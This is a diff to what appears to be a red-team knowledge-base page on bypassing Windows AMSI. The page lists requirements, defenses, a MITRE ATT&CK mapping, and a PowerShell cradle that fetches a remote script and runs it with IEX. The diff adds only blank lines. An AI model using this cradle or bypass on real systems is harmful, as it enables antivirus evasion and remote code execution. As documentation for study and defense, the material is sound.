@@ -36,6 +36,8 @@ At a technical level, this procedure involves locating the amsi.dll file, openin
 
 The business value of this procedure is that it allows an attacker to bypass antivirus protections and execute malicious scripts, potentially leading to the compromise of sensitive data or systems.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
@@ -43,6 +45,8 @@ The business value of this procedure is that it allows an attacker to bypass ant
 1. Permission to modify system files
 
 1. Hex editor software or similar tool
+
+ 
 
 ## Defense
 
@@ -52,19 +56,31 @@ The business value of this procedure is that it allows an attacker to bypass ant
 
 1. Monitor system logs for signs of unauthorized file modifications
 
+ 
+
 ## Objectives
 
 1. Bypass AMSI to execute malicious scripts undetected
 
 1. Compromise sensitive data or systems
 
+ 
+
 # Instructions
 
 1. This command executes a malicious script by sending a web request to a URL hosting the script and then executing the script on the system using the Invoke-Expression cmdlet.
 
+ 
+
+
+
 **Code**: [[$webreq = [System.Net.WebRequest]::Create(‘https:/]]
 
+
+
 > The script is downloaded from a remote server and executed on the system without any user interaction. This can be used to perform various malicious activities such as stealing sensitive information, installing malware, or gaining unauthorized access to the system.
+
+
 
 **Command** ([[Download and execute malicious script]]):
 
@@ -76,6 +92,8 @@ $reader=[System.IO.StreamReader]::new($respstream)
 $content=$reader.ReadToEnd()
 IEX($content)
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -100,3 +118,5 @@ IEX($content)
 
 - [[Dont use net webclient]]
 - [[Patching amsi.dll AmsiScanBuffer by rasta-mouse]]
+
+
